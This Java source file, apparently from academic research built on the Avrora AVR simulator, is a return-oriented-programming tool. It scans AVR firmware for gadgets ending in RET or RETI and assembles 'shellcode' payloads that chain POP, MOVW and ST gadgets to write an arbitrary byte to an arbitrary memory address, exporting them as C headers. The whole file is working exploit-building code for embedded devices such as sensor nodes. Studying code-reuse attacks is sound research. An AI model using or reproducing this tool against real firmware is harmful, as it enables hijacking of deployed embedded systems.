/**
 * Copyright (c) 2004-2005, Regents of the University of California
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * Redistributions of source code must retain the above copyright notice,
 * this list of conditions and the following disclaimer.
 *
 * Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 *
 * Neither the name of the University of California, Los Angeles nor the
 * names of its contributors may be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package avrora.actions;

import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;

import avrora.Defaults;
import avrora.Main;
import avrora.arch.AbstractDisassembler;
import avrora.arch.AbstractInstr;
import avrora.arch.legacy.LegacyInstr;
import avrora.core.Program;
import avrora.core.ProgramReader;
import cck.text.StringUtil;
import cck.text.Terminal;
import cck.util.Arithmetic;
import cck.util.Option;
import cck.util.Util;

/**
 * The <code>FindGadgetsAction</code> class represents an action that allows
 * the user to disassemble a binary file and Lookup the potential "gadgets"
 * found in the code ....
 * This is not particulary well made, if i had to do it again i would make 
 * it much cleaner, I will do it if i have some spare time ...
 * 
 * reusing code written by: 
 * @author Ben L. Titzer,
 * all bugs and mess from:
 * @author A. Francillon 
 */
public class FindGadgetsAction extends Action {
    
    Option.Str ARCH = newOption("arch", "avr",
            "This option selects the architecture for the disassembler.");
    
    Option.Str META_INSTR= newOption("metainstr", "LD",
        "Builds a payload to execute the meta instruction given in parameter."
         +"default value is LD, possible values are \n "
         + "LD load a byte into arbitrary memory area \n"
         + "SP change Stack Pointer \n" 
         + "NONE just dump all gadgets\n"
         );


    Option.Long MAX_LENGTH = newOption("max-length", 16,
            "This option specifies the maximum length of an instruction in bytes.");
    
    Option.Str OUTFILE = newOption(
            "outfile",
            "",
            "When this option is specified, teh payload will be dumped into a C header file .");

    Option.Str FILE = newOption(
            "file",
            "",
            "When this option is specified, this action will test the disassembler by loading the "
                    + "specified file and disassembling the data contained inside.");

    public FindGadgetsAction() {
        super(
                "The \"findgadgets\" action disassembles a binary file into source level instructions"
                        + " and searches for specificassembly sequences");
    }

    GadgetsSet gadgets;

    AbstractDisassembler da;

    /**
     * The <code>run()</code> method executes the action. The arguments on the
     * command line are passed. The <code>Disassemble</code> action expects
     * the first argument to be the name of the file to disassemble.
     * 
     * @param args
     *            the command line arguments
     * @throws Exception
     *             if there is a problem reading the file or disassembling the
     *             instructions in the file
     */
    public void run(String[] args) throws Exception {
        //Byte[] buf;
        
        // AbstractArchitecture arch =
        // ArchitectureRegistry.getArchitecture(ARCH.get());
        // da = arch.getDisassembler();
        
        
        // load and lookup a file for gadgets
        Terminal.println("searching for gadgets in file " + FILE.get());
        gadgets = findGadgets();
        // gadgets.print();
        Terminal.println("->"+META_INSTR.get());
        if (META_INSTR.get().equals("NONE")){
            gadgets.print();
            return;
        }
        Payload buf;
        if (META_INSTR.get()=="LD"){
        // write Byte 0x0A to address 0x0190
            Terminal.println("Gadget for injecting one byte :");
            buf = createShellCodeInjectByteToMemory((byte) 0xAF, 0xDEAF );
        }else if (META_INSTR.get()=="SP"){
            Terminal.println("Gadget for changing :");
            buf = createShellCodeChangeSP(0xDEAF );          
        }else{
            Terminal.println(META_INSTR.get()+" not implemented");
            return;   
        }
        // and one for the C file 
        //      TODO : bueark   
        if(!OUTFILE.get().equals("")){
            buf.PrintPayload(OUTFILE.get());
        }else{
            // one for the terminal 
            buf.PrintPayload();
        }
        
        //buf.PrintPayload("/home/francill/work/UbisecSens/usss-git/tinyos-2.x/apps/VulnToLeds/self/payloads.h");
        // inject payload ?

    }

    private Payload createShellCodeChangeSP(int address) {
        // TODO Auto-generated method stub
        Terminal.println("createShellCodeChangeSP Not Implemented");
        return new Payload();
    }

    /**
     * CreateShellCodeInjectByteToMemory builds a shell code it for current
     * program
     * 
     * @return a byte array containing the shellcode
     * @throws Exception
     */
    @SuppressWarnings("unchecked")
    public Payload createShellCodeInjectByteToMemory(byte value, Integer address)
            throws LegacyInstr.InvalidImmediate {

        Payload payload1 = createShellCodeInjectByteToMemory_strategy1(value, address);
        Payload payload2 = createShellCodeInjectByteToMemory_strategy2(value, address);
        Payload payload3 = createShellCodeInjectByteToMemory_strategy3(value, address);

//        payload2 = createShellCodeInjectByteToMemory_strategy_memcpy(value,
//                address);

         Terminal.println("Strategy 1:");
         payload1.PrintPayload();
         Terminal.println("Strategy 2:");
         payload2.PrintPayload();
         Terminal.println("Strategy 3:");
         payload3.PrintPayload();
                
        if (payload3.size() < payload1.size()
                && payload3.size() < payload2.size())
            return payload3;
        if (payload2.size() < payload1.size()
                && payload2.size() < payload3.size())
            return payload2;
        else
            return payload1;

    }
//
//    public Object[] createShellCodeMemcpy_1(Integer dataReg, Integer addrReg)
//            throws LegacyInstr.InvalidImmediate {
//
//    }
//
//    public Object[] createShellCodeMemcpy_2(Integer dataReg, Integer addrReg)
//            throws LegacyInstr.InvalidImmediate {
//
//    }
//
//    private Byte[] createShellCodeInjectByteToMemory_strategy_memcpy(
//            byte value, Integer address) {
//
//        Payload.PayloadMemcpy payload=createShellCodeMemcpy();
//            
//            
//        
//        return null;
//    }

    /**
     * CreateShellCodeInjectByteToMemory builds a shell code it for current
     * program
     * 
     * @return a byte array containing the shellcode
     * @throws Exception
     */
    @SuppressWarnings("unchecked")
    public Payload.PayloadLD createShellCodeLD()
            throws LegacyInstr.InvalidImmediate {

        Payload.PayloadLD payload=new Payload.PayloadLD();
        //Integer dataReg, Integer addrReg;
        
        Terminal.println("adding ret to 0x0000 ");
        payload.addFakeReboot();
        // strategy 1:
        // - copy address from stack to reg with a pop
        // - copy value from stack to reg with a pop
        // - copy from reg to memory with ld

        // step 1 find shortests ld gadgets
        GadgetsSet stGadgets = gadgetsWithInstr(gadgets, LegacyInstr.ST.class,
                null);
        // Terminal.println("found gadgets "); stGadgets.print();
        Gadget smallSt = stGadgets.smallest();
        Terminal.println("smallest ST gadget");
        smallSt.print();

        Terminal.println("adding ret to ld at address "
                + StringUtil.to0xHex(smallSt.entryPointAddr(), 4));

        payload.addAddress(smallSt.entryPointAddr());

        LegacyInstr.ST st = (LegacyInstr.ST) smallSt.get((smallSt.firstKey()));
        payload.setDataReg(st.r2.getNumber());
        payload.setAddrReg( st.r1.getNumber());
        Terminal.println("data reg = " + payload.getDataReg() + " Addrreg " + payload.getAddrReg());
        return payload;
    }

    /**
     * CreateShellCodeInjectByteToMemory builds a shell code it for current
     * program
     * 
     * @return a byte array containing the shellcode
     * @throws Exception
     */
    @SuppressWarnings("unchecked")
    public Payload createShellCodeInjectByteToMemory_strategy1(byte value,
            Integer address) throws LegacyInstr.InvalidImmediate {

        Terminal.println("======== Strategy 1 ==========");

        Payload.PayloadLD payload = createShellCodeLD();

        Terminal.println("addrReg=" + payload.getAddrReg()+ " datareg=" + payload.getDataReg());

        // A set of features required for this gadget
        // features are a hash map where key is the register and object
        // is the class of the instruction
        ArrayList<Feature> features = new ArrayList<Feature>();
        features.add(new Feature(LegacyInstr.POP.class, payload.getDataReg(), value));
        features.add(new Feature(LegacyInstr.POP.class, payload.getAddrReg(), Arithmetic
                .low(address)));
        features.add(new Feature(LegacyInstr.POP.class, payload.getAddrReg()+ 1, Arithmetic
                .high(address)));

        // loading from stack to registers look for the shortest gadget doing
        // all that in once
        Terminal.println("smallest gadget with pop r" + payload.getAddrReg() + ":"
                + (payload.getAddrReg() + 1) + ", and r" + payload.getDataReg());
        findGadgets();

        GadgetsSet commongadgets = gadgets.filterGadgets(features);
        Terminal.println("gadgets with pop r" + (payload.getAddrReg()+ 1) + " and pop r"
                + payload.getAddrReg()+ " and pop r" + payload.getDataReg());
        // commongadgets.print();
        if (commongadgets.size() != 0) {
            Terminal.println("smallest");
            Gadget candidategadget_strategy1 = commongadgets
                    .smallestStackSize();
            candidategadget_strategy1.print();

            // adding this result to the stack
            payload.addGadget(candidategadget_strategy1, features);

            // return byte array of the stack
            // Byte array[]=new Byte[payload_strategy1.size()];
            // array=reverseStack(payload_strategy1).toArray(array);
            Terminal.println("Strategy 1 got payload of length "
                    + payload.size());

            // return array;

            return payload;
            // return array;

        } else {
            Terminal.println("Strategy 1  found nothing interesting ...");
            return null;
        }
    }


    /**
     * CreateShellCodeInjectByteToMemory builds a shell code it for current
     * program Strategy 3 try to find a gadget to copy some lower register to Z
     * Expect that chaining pop rx , movw Z rx is "cheaper" than pop Z
     * 
     * @return a byte array containing the shellcode
     * @throws Exception
     */
    @SuppressWarnings("unchecked")
    public Payload createShellCodeInjectByteToMemory_strategy3(byte value,
            Integer address) throws LegacyInstr.InvalidImmediate {

        Terminal.println("======== Strategy 3 ==========");
        // that's so ugly ...
        Payload.PayloadLD payload= createShellCodeLD();
        
        // find possible Addrreg pop ?
        Terminal.println("smallest gadget with pop r" + payload.getAddrReg() + ":"
                + (payload.getAddrReg() + 1));

        // a feature to movw to Z
        ArrayList<Feature> features_movw = new ArrayList<Feature>();
        // features_movw.add(new
        // Feature(LegacyInstr.MOVW.class,addrReg+1,null));
        features_movw.add(new Feature(LegacyInstr.MOVW.class, payload.getAddrReg()));
        GadgetsSet movw_gadgets = gadgets.filterGadgets(features_movw);
        // gadgets.print();
        movw_gadgets = movw_gadgets.excludeGadgetsWithCall();

        Gadget candidate = movw_gadgets.smallestStackSize();
        candidate.print();

        // find a gadget to pop values on stack to registers for movw
        Integer movw_src_reg = ((LegacyInstr.MOVW) candidate.get(candidate
                .firstKey())).r2.getNumber();
        ArrayList<Feature> features_pop_reg_for_movw = new ArrayList<Feature>();
        features_pop_reg_for_movw.add(new Feature(LegacyInstr.POP.class,
                movw_src_reg, Arithmetic.low(address),Feature.ADDR_LOW));
        features_pop_reg_for_movw.add(new Feature(LegacyInstr.POP.class,
                movw_src_reg + 1, Arithmetic.high(address),Feature.ADDR_HIGH));

        GadgetsSet pop_reg_for_movw_gadgets = gadgets
                .filterGadgets(features_pop_reg_for_movw);
        pop_reg_for_movw_gadgets = pop_reg_for_movw_gadgets
                .excludeGadgetsWithCall();

        // do this just before calling st such that we reduce the
        // chances to corrupt register
        ArrayList<Feature> features_dataReg = new ArrayList<Feature>();
        features_dataReg
                .add(new Feature(LegacyInstr.POP.class, payload.getDataReg(), value,Feature.DATA));
        GadgetsSet pop_dataReg = gadgets.filterGadgets(features_dataReg);

        Terminal
                .println("find a gadget to pop values on stack to registers for movw");
        pop_reg_for_movw_gadgets.smallestStackSize().print();

        payload.addGadget( pop_dataReg.smallestStackSize(),
                    features_dataReg);
        payload.addGadget(pop_reg_for_movw_gadgets.smallestStackSize(),
                    features_pop_reg_for_movw);

        return payload;

    }

    /**
     * CreateShellCodeInjectByteToMemory builds a shell code it for current
     * program
     * 
     * @return a byte array containing the shellcode
     * @throws Exception
     */
    @SuppressWarnings("unchecked")
    public Payload createShellCodeInjectByteToMemory_strategy2(byte value,
            Integer address) throws LegacyInstr.InvalidImmediate {
        Terminal.println("======== Strategy 2 ==========");

        // that's so ugly ...
        Payload.PayloadLD payload= createShellCodeLD();
        
        // find possible Addrreg pop ?
        Terminal.println("smallest gadget with pop r" + payload.getAddrReg() + ":"
                + ( payload.getAddrReg()+ 1));

        // a feature to pop address Registers
        ArrayList<Feature> features_addr = new ArrayList<Feature>();
        features_addr.add(new Feature(LegacyInstr.POP.class, payload.getAddrReg() + 1,
                Arithmetic.low(address)));
        features_addr.add(new Feature(LegacyInstr.POP.class, payload.getAddrReg(),
                Arithmetic.low(address)));

        GadgetsSet popAddrGadgets = gadgets.filterGadgets(features_addr);

        // a feature to pop data Reg
        ArrayList<Feature> features_data = new ArrayList<Feature>();
        features_data.add(new Feature(LegacyInstr.POP.class, payload.getDataReg(), value));
        // filter ou the gadgets
        GadgetsSet popDataGadgets = gadgets.filterGadgets(features_data);

        if (!popAddrGadgets.isEmpty() && !popDataGadgets.isEmpty()) {
            Terminal.println(" we found some candidates ... ");
            Terminal.println(" to pop addr reg : ... ");
            popAddrGadgets.smallest().print();
            Terminal.println(" to pop data reg : ... ");
            popDataGadgets.smallest().print();
            payload.addGadget( popAddrGadgets.smallest(),features_addr);
            payload.addGadget(popDataGadgets.smallest(), features_data);
            return payload;
        }
        return null;

    }

    /**
     * Should be a visitor ?
     * 
     * @return true if feature has been applied
     */
    
    
    private GadgetsSet gadgetsWithInstr(GadgetsSet gadgets, Class instr,
            Integer register) {
        GadgetsSet result = new GadgetsSet();

        Iterator<Gadget> i = gadgets.iterator();
        while (i.hasNext()) {
            Gadget g = gadgets.nextGadget(i);
            Integer pos = g.hasInstr(instr, register);
            if (pos != null) {
                // Terminal.println("gadget match at pos "+pos);
                // g.print();
                Gadget newG = new Gadget(g, pos);
                result.addGadget(newG);
            }
        }
        return result;
    }

    GadgetsSet findGadgetsPopR(int reg, GadgetsSet gadgets) {

        return gadgetsWithPop(gadgets, reg);
    }

    /**
     * <code>findGadgetsPopr</code> seraches for all gadgets providing the
     * instruction pop rx
     * 
     * @param reg
     *            the register poped by the gadget
     */
    void findGadgetsPopR(int reg) {
        GadgetsSet popgadgetsr = gadgetsWithPop(gadgets, reg);
        Terminal.println("there are " + popgadgetsr.size()
                + " gadgets with pop r" + reg + " instr");
        // popgadgetsr.print();
    }

    @SuppressWarnings("unused")
    private GadgetsSet gadgetsWithPop(GadgetsSet gadgets) {
        return gadgetsWithPop(gadgets, null);
    }

    private GadgetsSet gadgetsWithPop(GadgetsSet gadgets, int reg) {
        return gadgetsWithPop(gadgets, new Integer(reg));
    }

    private GadgetsSet gadgetsWithPop(GadgetsSet gadgets, Integer register) {
        GadgetsSet result = new GadgetsSet();

        Iterator<Gadget> i = gadgets.iterator();

        while (i.hasNext()) {
            Gadget g = gadgets.nextGadget(i);
            if (null != g.hasPop(register)) {
                result.addGadget(g);
            }
        }
        return result;
    }

    @SuppressWarnings("unused")
    private void disassembleArguments(String[] args, byte[] buf) {
        Terminal.println("running Lookup with arguments :" + args + "\n");
        if (args.length < 1)
            Util.userError("no input data");

        for (int cntr = 0; cntr < args.length; cntr++) {
            buf[cntr] = (byte) StringUtil.evaluateIntegerLiteral(args[cntr]);
        }

        disassembleAndPrint(buf, 0);
    }

    @SuppressWarnings("unused")
    private void disassembleFile() throws IOException {
        String fname = FILE.get();
        Main.checkFileExists(fname);
        FileInputStream fis = new FileInputStream(fname);
        byte[] buf = new byte[fis.available()];
        fis.read(buf);
        for (int cntr = 0; cntr < buf.length;) {
            cntr += disassembleAndPrint(buf, cntr);
        }
    }

    private GadgetsSet findGadgets() {
        GadgetsSet gadgets = new GadgetsSet();

        int gadgestadded = 0;

        String fname = FILE.get();
        String args[] = new String[1];
        args[0] = fname;

        ProgramReader reader = new Defaults.AutoProgramReader();
        Program program;
        try {
            program = reader.read(args);
        } catch (Exception e) {
            // TODO Auto-generated catch block
            Terminal.println("failed to read program " + FILE.get());
            e.printStackTrace();
            return null;
        }
        int lastret = 0;
        // starting direct from flash_data as we don't care it a section is
        // marked as
        // executable or not ... we just can execute them is we find interesting
        // gadgets in there ...
        for (int retAddress = program.program_start; retAddress < program.program_end;) {
            try {
                AbstractInstr instr = program.disassembleInstr(retAddress);

                retAddress = retAddress + 2;
                if ((instr instanceof LegacyInstr.RET)
                        || (instr instanceof LegacyInstr.RETI)) {
                    // Terminal.println("at addr"+StringUtil.to0xHex(cntr, 4)+"
                    // "
                    // +instr.toString());
                    int from = retAddress - 60;
                    if (lastret > from)
                        from = lastret;
                    Gadget newGadget = createGadget(program, from, retAddress);
                    gadgets.addGadget(newGadget);
                    lastret = retAddress;
                    // newGadget.print();
                    gadgestadded++;
                }
            } catch (Exception i) {
                i.printStackTrace();
            }
        }
        // Terminal.println("Found "+gadgestadded+" gadgets ; gadgets.size()=="+
        // gadgets.size());
        return gadgets;
    }

    @SuppressWarnings("unused")
    private Gadget createGadget(byte[] buf, int from, int to)
            throws IOException {
        Gadget currGadget = new Gadget(to);
        int len = 2;

        for (int addr = from; addr < buf.length && addr < to;) {
            AbstractInstr instr = da.disassemble(0, addr, buf);

            if (instr != null)
                len = instr.getSize();
            else
                len = 2;

            currGadget.addInstr(new Integer(addr), instr);
            addr += len;
        }
        return currGadget;
    }

    private Gadget createGadget(Program p, int from, int to) throws IOException {
        Gadget currGadget = new Gadget(to);
        // Terminal.println("created a gadget to addr " +to);
        int len = 2;

        for (int addr = from; addr < p.program_end && addr < to;) {
            AbstractInstr instr = p.disassembleInstr(addr);

            if (instr != null)
                len = instr.getSize();
            else
                len = 2;

            currGadget.addInstr(new Integer(addr), instr);
            addr += len;
        }
        return currGadget;
    }

    @SuppressWarnings("unused")
    private void disassembleBytes(byte[] buf, int from, int to)
            throws IOException {

        Terminal.println("=============");
        for (int cntr = from; cntr < buf.length && cntr < to;) {
            cntr += disassembleAndPrint(buf, cntr);
        }

        Terminal.println("=============");
    }

    private int disassembleAndPrint(byte[] buf, int off) {
        String result;
        int len = 2;
        AbstractInstr instr = da.disassemble(0, off, buf);
        if (instr == null)
            result = "null";
        else {
            result = instr.toString();
            len = instr.getSize();
        }
        print(buf, off, len, result);
        return len;
    }

    private static void print(byte[] buf, int off, int len, String str) {
        StringBuffer sbuf = new StringBuffer();
        sbuf.append(StringUtil.addrToString(off));
        sbuf.append(": ");
        for (int cntr = 0; cntr < len; cntr++) {
            StringUtil.toHex(sbuf, buf[off + cntr], 2);
            sbuf.append(' ');
        }
        for (int cntr = sbuf.length(); cntr < 30; cntr++)
            sbuf.append(' ');
        sbuf.append(str);
        Terminal.println(sbuf.toString());
    }
}
